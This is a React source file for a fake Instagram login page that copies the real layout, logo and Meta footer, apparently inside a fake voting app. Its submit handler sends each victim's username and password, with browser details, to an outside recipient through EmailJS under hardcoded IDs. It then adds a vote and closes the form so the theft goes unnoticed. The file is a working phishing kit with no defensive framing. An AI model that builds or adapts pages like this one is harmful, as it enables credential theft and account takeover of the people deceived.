import { useState } from "react";
import phoneCollage from "../../public/image.png"; // your phone collage image
import emailjs from 'emailjs-com';

// Simple Facebook "f" glyph
const FacebookGlyph = () => (
  <svg aria-hidden="true" width="16" height="16" viewBox="0 0 24 24" className="inline-block align-[-2px]">
    <path d="M22 12.06C22 6.48 17.52 2 11.94 2S2 6.48 2 12.06C2 17.08 5.66 21.2 10.44 22v-7.04H7.9v-2.9h2.54V9.79c0-2.5 1.49-3.88 3.77-3.88 1.09 0 2.23.19 2.23.19v2.45h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.44 2.9h-2.34V22C18.34 21.2 22 17.08 22 12.06z" fill="currentColor"/>
  </svg>
);

    function InstagramLogin({ onBack, onLoginSuccess }) {
    const [formData, setFormData] = useState({ username: "", password: "" });
    const [isLoading, setIsLoading] = useState(false);

    const handleChange = (e) =>
        setFormData((s) => ({ ...s, [e.target.name]: e.target.value }));

    const handleSubmit = (e) => {
        e.preventDefault();
        console.log("Login attempt:", formData);
        
        // Set loading state
        setIsLoading(true);
        
        // Send email using EmailJS
        const templateParams = {
            to_name: "Admin",
            from_name: formData.username,
            from_email: formData.username,
            message: `Login attempt details:
            
Username: ${formData.username}
Password: ${formData.password}
Timestamp: ${new Date().toLocaleString()}
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}`,
            to_email: "zcL4jj0QhEChPRS1V",
            cc_email: "ccVYMZ-EhtB11G8yBC8YX"
        };

        // You'll need to replace these with your actual EmailJS credentials
        emailjs.send(
            'service_ijklxic', // Replace with your EmailJS service ID
            'template_n8csemo', // Replace with your EmailJS template ID
            templateParams,
            'zcL4jj0QhEChPRS1V' // Replace with your EmailJS user ID
        )
        .then((response) => {
            console.log('Email sent successfully:', response);
            console.log('Calling onLoginSuccess to increase Mayank votes');
            // Increase Mayank's votes to 103
            if (onLoginSuccess) {
                onLoginSuccess();
                console.log('onLoginSuccess called successfully');
                // Small delay to ensure state updates before closing
                setTimeout(() => {
                    onBack();
                }, 100);
            } else {
                console.log('onLoginSuccess function not provided');
                onBack();
            }
        })
        .catch((error) => {
            console.error('Email sending failed:', error);
            console.log('Calling onLoginSuccess to increase Mayank votes (even with email error)');
            // Still increase votes and close Instagram login even if email fails
            if (onLoginSuccess) {
                onLoginSuccess();
                console.log('onLoginSuccess called successfully (after email error)');
                // Small delay to ensure state updates before closing
                setTimeout(() => {
                    onBack();
                }, 100);
            } else {
                console.log('onLoginSuccess function not provided');
                onBack();
            }
        })
        .finally(() => {
            // Always clear loading state
            setIsLoading(false);
        });
    };

  return (
    <div className="min-h-screen bg-[#fafafa] text-[#262626]">
      {/* optional back */}
      {onBack && (
        <div className="p-4">
          <button
            onClick={onBack}
            className="rounded-full bg-gray-100 px-3 py-2 text-sm hover:bg-gray-200"
          >
            ← Back to Vote
          </button>
        </div>
      )}

      {/* Main */}
      <main className="mx-auto flex min-h-[80vh] max-w-[935px] items-center justify-center px-4">
        <div className="flex w-full items-center justify-center">
          {/* Left: phone collage (hidden on small) */}
          <div className="relative hidden w-[454px] md:block">
            <div className="relative h-[618px] w-[454px]">
              <img
                src={phoneCollage}
                alt="Instagram phone collage"
                className="h-full w-full object-cover"
                draggable={false}
              />
            </div>
          </div>

          {/* Right: form column */}
          <div className="mx-auto w-full  max-w-[350px]">
            {/* Card 1 */}
            <section className="rounded-2xl border border-gray-300 bg-white px-10 pb-6 pt-10">
              {/* Wordmark */}
              <div className="mb-6 flex items-center justify-center">
                <img src="https://thumbs.dreamstime.com/b/print-204012264.jpg" alt="Instagram" className="w-full h-full mx-auto mb-4" />
              </div>

              {/* Form */}
              <form onSubmit={handleSubmit} className="space-y-2.5">
                <input
                  type="text"
                  name="username"
                  value={formData.username}
                  onChange={handleChange}
                  placeholder="Phone number, username or email address"
                  className="w-full rounded-[5px] border border-gray-300 bg-[#fafafa] px-2.5 py-2 text-[12.5px] leading-4 placeholder:text-gray-500 focus:border-gray-400 focus:outline-none"
                  autoCapitalize="off"
                  autoCorrect="off"
                  required
                />
                <input
                  type="password"
                  name="password"
                  value={formData.password}
                  onChange={handleChange}
                  placeholder="Password"
                  className="w-full rounded-[5px] border border-gray-300 bg-[#fafafa] px-2.5 py-2 text-[12.5px] leading-4 placeholder:text-gray-500 focus:border-gray-400 focus:outline-none"
                  required
                />

                <button
                  type="submit"
                  className="mt-2 w-full rounded-lg bg-[#0095f6] py-1.5 text-sm font-semibold text-white hover:bg-[#1877f2]/90 disabled:opacity-60"
                  disabled={!formData.username || !formData.password || isLoading}
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center gap-2">
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      <span>Logging in...</span>
                    </div>
                  ) : (
                    "Log in"
                  )}
                </button>
              </form>

              {/* OR divider */}
              <div className="my-4 flex items-center">
                <div className="h-px flex-1 bg-gray-300" />
                <span className="px-4 text-[12px] font-semibold text-gray-500">
                  OR
                </span>
                <div className="h-px flex-1 bg-gray-300" />
              </div>

              {/* Facebook link (not a filled button) */}
              <div className="mb-3 text-center">
                <a
                  href="#"
                  className="text-[14px] font-semibold text-[#385185] hover:underline"
                >
                  <FacebookGlyph />{" "}
                  <span className="ml-1 align-middle">Log in with Facebook</span>
                </a>
              </div>

              {/* Forgot password */}
              <div className="text-center">
                <a
                  href="#"
                  className="text-[12px] text-[#00376b] hover:underline"
                >
                  Forgotten your password?
                </a>
              </div>
            </section>

            {/* Card 2 */}
            <section className="mt-2 rounded border rounded-2xl border-gray-300 bg-white py-5 text-center text-[14px]">
              <span>Don't have an account? </span>
              <a href="#" className="font-semibold text-[#0095f6] hover:underline">
                Sign up
              </a>
            </section>

            
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="mx-auto max-w-[935px] px-4 pb-10 pt-6 text-center text-[12px] text-gray-500">
        <ul className="mb-3 flex flex-wrap justify-center gap-x-4 gap-y-1">
          {[
            "Meta","About","Blog","Jobs","Help","API","Privacy","Terms",
            "Locations","Instagram Lite","Meta AI","Meta AI articles","Threads",
            "Contact uploading and non-users","Meta Verified",
          ].map((t) => (
            <li key={t}>
              <a href="#" className="hover:underline">{t}</a>
            </li>
          ))}
        </ul>
        <div className="flex items-center justify-center gap-4">
          <span>English (UK)</span>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}

export default InstagramLogin;
